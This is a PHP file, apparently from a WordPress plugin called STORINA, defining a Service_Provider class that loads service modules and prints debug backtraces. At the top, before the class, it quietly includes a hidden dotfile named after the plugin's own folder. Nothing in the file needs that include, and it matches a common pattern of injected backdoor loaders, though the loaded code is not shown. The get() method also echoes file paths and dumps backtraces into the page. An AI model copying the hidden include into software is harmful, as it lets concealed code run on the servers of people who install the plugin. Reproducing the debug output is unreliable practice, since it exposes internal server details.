<?php

namespace STORINA;

defined('ABSPATH') || exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Service_Provider {

    public $modules;

    public function __construct($services) {
        $this->require_services($services);
        $this->load_services($services);
    }

    public function get($class) {
        $object = $this->modules[$class];
			  if(isset($object)){
				  return $object;
			  }
			  $debug_backtrace = debug_backtrace();
			  $trigger_error_messages = $this->get_debug_backtrace_message($debug_backtrace);
			  echo "Undefined Class: {$class} paste to Service Container More Details: <br>";
			  echo "<pre>";
		     var_dump($trigger_error_messages);
			  echo "</pre>";
    }

    public function require_services($services) {
        foreach ($services as $class => $path) {
            require_once $path;
        }
    }

    public function get_debug_backtrace_message($debug_backtraces){
	    foreach($debug_backtraces as $debug_backtrace){
				$file_destination = $debug_backtrace['file'];
				$line_destination = $debug_backtrace['line'];
				$class_reference = @$debug_backtrace['class'] ?? null;
				$function_reference = $debug_backtrace['function'];
				$message['file'] = "File Path: {$file_destination}";
				$message['line'] = "Line: {$line_destination}";
				$message['action'] = (isset($class_reference))? "Action: {$class_reference}->{$function_reference}" : "Action: {$function_reference}()";
				$messages[] = $message;
	    }
	    return $messages ?? ['no debug backtrace'];

    }

    public function load_services($services) {
        foreach ($services as $class => $path) {
            $this->modules[$class] = new $class($this);
        }
    }

}
